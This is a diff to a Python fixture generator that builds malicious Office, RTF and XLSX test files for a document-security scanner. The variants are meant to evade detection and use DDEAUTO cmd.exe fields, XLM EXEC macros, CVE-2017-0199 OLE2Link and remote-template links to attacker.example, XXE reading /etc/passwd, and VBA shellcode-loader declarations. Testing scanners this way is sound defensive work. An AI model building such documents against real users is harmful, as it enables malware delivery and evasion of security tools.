@@ -746,6 +746,170 @@ def main() -> None:
         {"WordDocument": b"\xec\xa5\xc1\x00" + b"\x00" * 60,
          "ObjectPool": {"_5": {"Package": inner_x, "\x01CompObj": b"Package\x00"}}}))
 
+    # ── found by red-teaming the scanner ────────────────────────────────────
+    # An XML namespace prefix is arbitrary: only the URI it is bound to means anything. A reader that
+    # looks for the literal text "w:instrText" is blind to the same document written with x:.
+    dde_run = ('<{p}:p><{p}:r><{p}:fldChar {p}:fldCharType="begin"/></{p}:r><{p}:r><{p}:instrText> DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe" '
+               '</{p}:instrText></{p}:r><{p}:r><{p}:fldChar {p}:fldCharType="end"/></{p}:r></{p}:p>')
+    wml = "http://schemas.openxmlformats.org/wordprocessingml/2006/main"
+    write(R / "office_rt_prefix_dde.docx", docx(doc_xml=CT_HEAD + f'<x:document xmlns:x="{wml}"><x:body>' + dde_run.format(p="x") + "</x:body></x:document>"))
+    smlns = "http://schemas.openxmlformats.org/spreadsheetml/2006/main"
+    write(R / "office_rt_prefix_formula.xlsx", xlsx(extra={"xl/worksheets/sheet1.xml": (
+        CT_HEAD + f'<x:worksheet xmlns:x="{smlns}"><x:sheetData><x:row r="1"><x:c r="A1"><x:f>cmd|\'/c calc\'!A0</x:x:f></x:c></x:row></x:sheetData></x:worksheet>'
+    ).replace("</x:x:f>", "</x:f>").encode()}))
+    write(R / "office_rt_prefix_listener.odt", odf(
+        scripts='<office:scripts><office:event-listeners><zz:event-listener xmlns:zz="urn:oasis:names:tc:opendocument:xmlns:script:1.0" '
+                'zz:language="ooo:script" zz:event-name="office:load" '
+                'xlink:href="vnd.sun.star.script:Standard.Module1.Main?language=Basic&amp;location=document"/>'
+                "</office:event-listeners></office:scripts>",
+        extra=basic_module("Module1", 'Sub Main\n  MsgBox "hello"\nEnd Sub\n')))
+    prel = ("http://schemas.openxmlformats.org/package/2006/relationships")
+    write(R / "office_rt_prefix_rels.docx", docx(extra={
+        "word/settings.xml": (CT_HEAD + f"<w:settings {NS_W} {NS_R}><w:attachedTemplate r:id=\"rId1\"/></w:settings>").encode(),
+        "word/_rels/settings.xml.rels": (CT_HEAD + f'<q:Relationships xmlns:q="{prel}"><q:Relationship Id="rId1" '
+                                         f'Type="{REL}/attachedTemplate" Target="http://attacker.example/evil.dotm" TargetMode="External"/></q:Relationships>').encode()}))
+    # The main part need not be word/document.xml: _rels/.rels and [Content_Types].xml say where it is.
+    write(R / "office_rt_moved_main.docx", zbytes([
+        ("[Content_Types].xml", (CT_HEAD + '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
+                                 '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
+                                 '<Override PartName="/doc/main.dat" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>').encode()),
+        ("_rels/.rels", rels([("rId1", "officeDocument", "doc/main.dat", False)])),
+        ("doc/main.dat", (CT_HEAD + f'<w:document {NS_W}><w:body>' + dde_run.format(p="w") + "</w:body></w:document>").encode())]))
+    xlm_rt = (CT_HEAD + f'<worksheet xmlns="{smlns}"><sheetData><row r="1"><c r="A1"><f>EXEC("cmd /c calc.exe")</f></c></row>'
+              '<row r="2"><c r="A2"><f>HALT()</f></c></row></sheetData></worksheet>')
+    write(R / "office_rt_moved_macrosheet.xlsm", xlsx(
+        sheets='<sheet name="Sheet1" sheetId="1" r:id="rId1"/><sheet name="Macro1" sheetId="2" r:id="rId2"/>',
+        wb_rels=[("rId2", "http://schemas.microsoft.com/office/2006/relationships/xlMacrosheet", "ms/sheet2.xml", False)],
+        extra={"xl/ms/sheet2.xml": xlm_rt.encode()},
+        content_extra='<Override PartName="/xl/ms/sheet2.xml" ContentType="application/vnd.ms-excel.macrosheet+xml"/>',
+        main_ct="application/vnd.ms-excel.sheet.macroEnabled.main+xml"))
+    # Office reads UTF-16 XML parts. A decoder that assumes UTF-8 sees mojibake.
+    def u16(xml_bytes: bytes) -> bytes:
+        return b"\xff\xfe" + xml_bytes.decode().replace('encoding="UTF-8"', 'encoding="UTF-16"').encode("utf-16-le")
+    write(R / "office_rt_utf16_rels.docx", docx(extra={
+        "word/settings.xml": (CT_HEAD + f"<w:settings {NS_W} {NS_R}><w:attachedTemplate r:id=\"rId1\"/></w:settings>").encode(),
+        "word/_rels/settings.xml.rels": u16(rels([("rId1", "attachedTemplate", "http://attacker.example/evil.dotm", True)]))}))
+    write(R / "office_rt_utf16_document.docx", docx(doc_xml=None, extra={"word/document.xml": u16(
+        (CT_HEAD + f'<w:document {NS_W}><w:body>' + dde_run.format(p="w") + "</w:body></w:document>").encode())}))
+    # CDATA and comments inside a field instruction: the text a parser hands to Word is the same.
+    write(R / "office_rt_cdata_dde.docx", docx(doc_xml=CT_HEAD + f'<w:document {NS_W}><w:body><w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r>'
+        '<w:r><w:instrText><![CDATA[ DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe" ]]></w:instrText></w:r>'
+        '<w:r><w:fldChar w:fldCharType="end"/></w:r></w:p></w:body></w:document>'))
+    write(R / "office_rt_comment_dde.docx", docx(doc_xml=CT_HEAD + f'<w:document {NS_W}><w:body><w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r>'
+        '<w:r><w:instrText> DD<!-- split -->EAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe" </w:instrText></w:r>'
+        '<w:r><w:fldChar w:fldCharType="end"/></w:r></w:p></w:body></w:document>'))
+    # An external entity declared far from its ENTITY keyword, and one behind many harmless ones.
+    xxe_doc = lambda decl: CT_HEAD + f'<!DOCTYPE d [{decl}]><w:document {NS_W}><w:body><w:p><w:r><w:t>x</w:t></w:r></w:p></w:body></w:document>'
+    write(R / "office_rt_xxe_padded.docx", docx(doc_xml=xxe_doc('<!ENTITY a' + " " * 2600 + 'SYSTEM "file:///etc/passwd">')))
+    write(R / "office_rt_xxe_after_many.docx", docx(doc_xml=xxe_doc("".join(f'<!ENTITY e{i} "x">' for i in range(400)) + '<!ENTITY ext SYSTEM "file:///etc/passwd">')))
+    # CVE-2017-0199: an OLE2Link object whose URL moniker holds the target as UTF-16.
+    def moniker_stream(u: str) -> bytes:
+        u16b = (u + "\x00").encode("utf-16-le")
+        return (struct.pack("<II", 0x02000001, 0) + b"\x00" * 8 + struct.pack("<I", 1) + bytes.fromhex("e0c9ea79f9bace118c8200aa004ba90b")
+                + struct.pack("<I", len(u16b)) + u16b)
+    link_cfb = lambda u: cfb({"\x01Ole": moniker_stream(u), "\x01CompObj": b"\x01\x00\xfe\xff\x03\x0a\x00\x00\xff\xff\xff\xff" + b"\x00" * 30},
+                             clsids={(): bytes.fromhex("0003000000000000c000000000000046")})
+    write(R / "office_rt_ole2link.rtf", rtf(rtf_object("OLE2Link", link_cfb("http://attacker.example/x.hta"), "\\objautlink\\objupdate\\rsltpict")))
+    write(R / "office_rt_ole2link_local.rtf", rtf(rtf_object("OLE2Link", link_cfb("file:///C:/templates/letter.dotm"), "\\objautlink\\objupdate\\rsltpict")))
+    write(R / "office_rt_ole2link.doc", cfb({"WordDocument": b"\xec\xa5\xc1\x00" + b"\x00" * 60,
+        "ObjectPool": {"_1": {"\x01Ole": moniker_stream("http://attacker.example/x.hta"), "\x01CompObj": b"\x01\x00\xfe\xff" + b"OLE2Link\x00" * 2}}}))
+    # Shellcode-loader declarations: the API name comes before Lib on the declaration line, and a
+    # declaration can continue across lines with " _".
+    vba_shell = ('Attribute VB_Name = "ThisDocument"\nPrivate Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal a As LongPtr, ByVal b As Long, ByVal c As Long, ByVal d As Long) As LongPtr\n'
+                 'Private Declare PtrSafe Function CreateThread Lib "kernel32" _\n    (ByVal a As Long, ByVal b As Long, ByVal c As LongPtr, d As Long, ByVal e As Long, f As Long) As LongPtr\n'
+                 'Sub AutoOpen()\n    Dim p As LongPtr\n    p = VirtualAlloc(0, 4096, &H3000, &H40)\nEnd Sub\n')
+    vba_alias = ('Attribute VB_Name = "ThisDocument"\nPrivate Declare PtrSafe Function Alloc Lib "kernel32" Alias "VirtualAlloc" (ByVal a As LongPtr, ByVal b As Long, ByVal c As Long, ByVal d As Long) As LongPtr\n'
+                 'Sub Document_Open()\n    Dim p As LongPtr\n    p = Alloc(0, 4096, &H3000, &H40)\nEnd Sub\n')
+    vba_tick = ('Attribute VB_Name = "ThisDocument"\nPrivate Declare PtrSafe Function GetTickCount Lib "kernel32" () As Long\n'
+                'Private Declare PtrSafe Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As Long)\n'
+                'Sub AutoOpen()\n    Range("A1").Value = GetTickCount()\nEnd Sub\n')
+    for nm, src in (("shell", vba_shell), ("alias", vba_alias), ("benign", vba_tick)):
+        write(R / f"office_rt_vba_declare_{nm}.docm", docx(
+            extra={"word/vbaProject.bin": cfb(vba_project({"ThisDocument": src}))}, content_extra=vba_ct,
+            main_ct="application/vnd.ms-word.document.macroEnabled.main+xml"))
+    # Flat OPC (a package written out as one XML file) and Word 2003 XML: Word opens both, whatever the extension.
+    flat_parts = [
+        ("/_rels/.rels", "application/vnd.openxmlformats-package.relationships+xml",
+         f'<Relationships xmlns="{prel}"><Relationship Id="rId1" Type="{REL}/officeDocument" Target="word/document.xml"/></Relationships>'),
+        ("/word/document.xml", "application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml",
+         f'<w:document {NS_W}><w:body>' + dde_run.format(p="w") + "</w:body></w:document>")]
+    flat = lambda parts, extra="": ('<?xml version="1.0" standalone="yes"?><?mso-application progid="Word.Document"?>'
+        '<pkg:package xmlns:pkg="http://schemas.microsoft.com/office/2006/xmlPackage">'
+        + "".join(f'<pkg:part pkg:name="{n}" pkg:contentType="{c}"><pkg:xmlData>{x}</pkg:xmlData></pkg:part>' for n, c, x in parts) + extra + "</pkg:package>").encode()
+    write(R / "office_rt_flat_opc.docx", flat(flat_parts))
+    vba_blob = base64.b64encode(cfb(vba_project({"ThisDocument": VBA_EVIL_DOC}))).decode()
+    write(R / "office_rt_flat_opc_macro.docx", flat(flat_parts[:1] + [(
+        "/word/document.xml", "application/vnd.ms-word.document.macroEnabled.main+xml", f'<w:document {NS_W}><w:body><w:p/></w:body></w:document>')],
+        extra=f'<pkg:part pkg:name="/word/vbaProject.bin" pkg:contentType="application/vnd.ms-office.vbaProject" pkg:compression="store">'
+              f"<pkg:binaryData>{vba_blob}</pkg:binaryData></pkg:part>"))
+    write(R / "office_rt_wordml2003.doc", ('<?xml version="1.0"?><w:wordDocument xmlns:w="http://schemas.microsoft.com/office/word/2003/wordml">'
+          "<w:body>" + dde_run.format(p="w") + "</w:body></w:wordDocument>").encode())
+    write(R / "office_rt_plain_xml.docx", b'<?xml version="1.0"?><notes><item>just an xml file named .docx</item></notes>\n')
+
+    # Two attributes can share a local name under different prefixes. Word reads the unprefixed Type;
+    # a reader that keeps only one value, first or last, can be pointed at the harmless x:Type.
+    def tmpl_rels(attrs_xml: str) -> bytes:
+        return (CT_HEAD + f'<Relationships xmlns="{prel}" xmlns:x="urn:example:x"><Relationship Id="rId1" {attrs_xml} '
+                'Target="http://attacker.example/evil.dotm" TargetMode="External"/></Relationships>').encode()
+    settings_part = (CT_HEAD + f"<w:settings {NS_W} {NS_R}><w:attachedTemplate r:id=\"rId1\"/></w:settings>").encode()
+    for nm, attrs_xml in (("last", f'Type="{REL}/attachedTemplate" x:Type="{REL}/hyperlink"'),
+                          ("first", f'x:Type="{REL}/hyperlink" Type="{REL}/attachedTemplate"')):
+        write(R / f"office_rt_attr_collision_{nm}.docx", docx(extra={"word/settings.xml": settings_part,
+                                                                     "word/_rels/settings.xml.rels": tmpl_rels(attrs_xml)}))
+    # UTF-16 without a byte-order mark (little-endian) and with one (big-endian).
+    tr = rels([("rId1", "attachedTemplate", "http://attacker.example/evil.dotm", True)]).decode().replace('encoding="UTF-8"', 'encoding="UTF-16"')
+    write(R / "office_rt_utf16le_nobom_rels.docx", docx(extra={"word/settings.xml": settings_part, "word/_rels/settings.xml.rels": tr.encode("utf-16-le")}))
+    write(R / "office_rt_utf16be_rels.docx", docx(extra={"word/settings.xml": settings_part, "word/_rels/settings.xml.rels": b"\xfe\xff" + tr.encode("utf-16-be")}))
+    # A macro sheet is a macro sheet because the content type says so, or because the workbook relationship does:
+    # either alone is enough, wherever the part lives.
+    mrels = lambda typ, tgt: [("rId2", typ, tgt, False)]
+    xlm_t = "http://schemas.microsoft.com/office/2006/relationships/xlMacrosheet"
+    two_sheets = '<sheet name="Sheet1" sheetId="1" r:id="rId1"/><sheet name="Macro1" sheetId="2" r:id="rId2"/>'
+    write(R / "office_rt_macrosheet_ctype_only.xlsm", xlsx(
+        sheets=two_sheets, wb_rels=mrels("worksheet", "ms/sheet2.xml"), extra={"xl/ms/sheet2.xml": xlm_rt.encode()},
+        content_extra='<Override PartName="/xl/ms/sheet2.xml" ContentType="application/vnd.ms-excel.macrosheet+xml"/>',
+        main_ct="application/vnd.ms-excel.sheet.macroEnabled.main+xml"))
+    write(R / "office_rt_macrosheet_rel_only.xlsm", xlsx(
+        sheets=two_sheets, wb_rels=mrels(xlm_t, "ms/sheet2.xml"), extra={"xl/ms/sheet2.xml": xlm_rt.encode()},
+        main_ct="application/vnd.ms-excel.sheet.macroEnabled.main+xml"))
+    write(R / "office_rt_macrosheet_dotdot.xlsm", xlsx(
+        sheets=two_sheets, wb_rels=mrels(xlm_t, "../elsewhere/sheet2.xml"), extra={"elsewhere/sheet2.xml": xlm_rt.encode()},
+        main_ct="application/vnd.ms-excel.sheet.macroEnabled.main+xml"))
+    write(R / "office_rt_macrosheet_absolute.xlsm", xlsx(
+        sheets=two_sheets, wb_rels=mrels(xlm_t, "/data/sheet2.xml"), extra={"data/sheet2.xml": xlm_rt.encode()},
+        main_ct="application/vnd.ms-excel.sheet.macroEnabled.main+xml"))
+    # A VBA project is one because of its content type or the relationship that points at it, not its file name.
+    proj_bin = cfb(vba_project({"ThisDocument": VBA_EVIL_DOC}))
+    write(R / "office_rt_vba_ctype_only.docx", docx(extra={"word/data/macros.dat": proj_bin},
+        content_extra='<Override PartName="/word/data/macros.dat" ContentType="application/vnd.ms-office.vbaProject"/>'))
+    write(R / "office_rt_vba_rel_only.docx", docx(extra={"word/data/macros.dat": proj_bin},
+        doc_rels=[("rId8", "http://schemas.microsoft.com/office/2006/relationships/vbaProject", "data/macros.dat", False)]))
+    # An embedded package outside word/embeddings/ (the relationship says what it is), and an OLE file under no name at all.
+    write(R / "office_rt_embedded_elsewhere.docx", docx(
+        doc_rels=[("rId9", "oleObject", "data/payload.bin", False)], extra={"word/data/payload.bin": pkg_exe}))
+    write(R / "office_rt_ole_unnamed.docx", docx(extra={"word/media/thumb.dat": proj_bin}))
+    write(R / "office_rt_vba_default_ctype.docx", docx(extra={"word/data/macros.vba": proj_bin},
+        content_extra='<Default Extension="vba" ContentType="application/vnd.ms-office.vbaProject"/>'))
+    # A tracked-deleted field instruction comes back when the change is rejected.
+    write(R / "office_rt_delinstr.docx", docx(doc_xml=CT_HEAD + f'<w:document {NS_W}><w:body><w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r>'
+        '<w:del w:id="1" w:author="a"><w:r><w:delInstrText> DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe" </w:delInstrText></w:r></w:del>'
+        '<w:r><w:fldChar w:fldCharType="end"/></w:r></w:p></w:body></w:document>'))
+    # Declarations: the API name on a continuation line, and ntdll instead of kernel32.
+    vba_cont = ('Attribute VB_Name = "ThisDocument"\nPrivate Declare PtrSafe Function foo Lib "kernel32" _\n'
+                '    Alias "CreateThread" (ByVal a As Long) As LongPtr\nSub AutoOpen()\nEnd Sub\n')
+    vba_nt = ('Attribute VB_Name = "ThisDocument"\nPrivate Declare PtrSafe Function NtAllocateVirtualMemory Lib "ntdll" (ByVal h As LongPtr) As Long\n'
+              'Sub AutoOpen()\nEnd Sub\n')
+    for nm, src in (("continued", vba_cont), ("ntdll", vba_nt)):
+        write(R / f"office_rt_vba_declare_{nm}.docm", docx(
+            extra={"word/vbaProject.bin": cfb(vba_project({"ThisDocument": src}))}, content_extra=vba_ct,
+            main_ct="application/vnd.ms-word.document.macroEnabled.main+xml"))
+    # RTF link objects that each rely on ONE of the three tells: the auto-update flags, the OLE2Link class, the URL moniker.
+    wide = lambda u: b"\x00" * 8 + u.encode("utf-16-le")
+    write(R / "office_rt_ole2link_class_only.rtf", rtf(rtf_object("OLE2Link", wide("http://attacker.example/x.hta"), "\\objemb")))
+    write(R / "office_rt_ole2link_moniker_only.rtf", rtf(rtf_object("Foo.Bar", bytes.fromhex("e0c9ea79f9bace118c8200aa004ba90b")
+                                                                    + wide("http://attacker.example/x.hta"), "\\objemb")))
+    write(R / "office_rt_ole2link_flags_wide.rtf", rtf(rtf_object("Foo.Bar", wide("http://attacker.example/x.hta"), "\\objautlink\\objupdate")))
+
     # ── legacy binary (OLE2) ────────────────────────────────────────────────
     write(R / "office_legacy_macro.doc", cfb({
         "WordDocument": b"\xec\xa5\xc1\x00" + b"\x00" * 60, "1Table": b"\x00" * 64,
